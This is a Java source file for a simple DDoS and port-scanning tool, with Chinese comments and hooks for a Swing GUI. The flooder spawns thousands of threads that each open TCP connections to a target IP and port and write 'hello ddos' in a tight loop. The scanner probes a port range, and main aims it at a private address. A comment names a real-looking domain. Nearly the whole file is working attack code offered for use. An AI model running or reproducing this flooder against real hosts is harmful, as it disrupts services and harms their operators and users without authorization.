package com.xmsoftware.ddos;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ConnectException;
import java.net.InetSocketAddress;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.SocketAddress;
import java.net.SocketException;
import java.net.URL;
import java.net.URLConnection;
import java.net.UnknownHostException;
import java.sql.Connection;
import java.util.ArrayList;
import java.util.List;

import javax.swing.JButton;
import javax.swing.JTextArea;
import javax.swing.text.AbstractDocument.BranchElement;

public class Ddos {
	
	public static boolean scan = true;
	public static boolean attack = true;

	public static void main(String[] args) {
		//扫描开房的socket端口
		findPort("10.211.55.4", 8080, 8081, null, null);
		
		//ddosAttack("10.211.55.4", 8080);
	}
	
	public static void ddosAttack(final String ip, final int port, final JButton attackButton, final JTextArea text){
		// 清空控制台
		if(text != null){
			text.setText("");
		}
		println(text, "开始DDOS攻击...");
		
		for(int i = 0;i < 9000; i++){
			println(text, i++ + " 次攻击");
			new Thread(new Runnable() {
				
				@Override
				public void run() {
					while(attack){
						Socket client = null;
						try {
							client = new Socket(); //www.huaxiapx.cn
							SocketAddress address = new InetSocketAddress(ip, port);
							client.connect(address, 1000);
							
							OutputStream out = client.getOutputStream();
							while(attack){
								try {
									out.write("hello ddos".getBytes());
									out.flush();
									System.out.println("ok");
								} catch (Exception e) {
									e.printStackTrace();
									break;
								}
								Thread.sleep(10);
							}
							
						} catch (Exception e) {
							if(client != null){
								try {
									client.close();
								} catch (IOException e1) {
									
								}
							}
						}
						
					}
					
				}
			}).start();
			
			
		}
		
	}
	
	/**
	 * 扫描port
	 * @param start
	 * @param end
	 */
	public static void  findPort(final String ip, final int start, final int end, final JButton scanButton, final JTextArea text){
		new Thread(new Runnable() {
			@Override
			public void run() {
				// 清空控制台
				if(text != null){
					text.setText("");
				}
				println(text, "开始端口扫描...");
				
				for(int port = start;(port <= end) && scan; port++){
					int pass = 0;
					for(int i = 0;i < 3; i++){
						try {
							Socket client = new Socket();
							client.connect(new InetSocketAddress(ip, port), 1000);
							client.setKeepAlive(true);
							
							pass++;
						} catch (ConnectException e1) {
						} catch (SocketException e2) {
						} catch (Exception e3) {
						}
					}
					
					if(pass >= 3){
						println(text, "ip=" + ip + " port=" + port);
					}
				}
				
				if(scanButton != null){
					scanButton.setEnabled(true);// 继续可以扫描
					println(text, "结束扫描!");
				}
			}
		}).start();
		
	}
	
	private static void println(JTextArea text, String line){
		if(text != null){
			text.append(line + "\r\n");
		}
	}

}
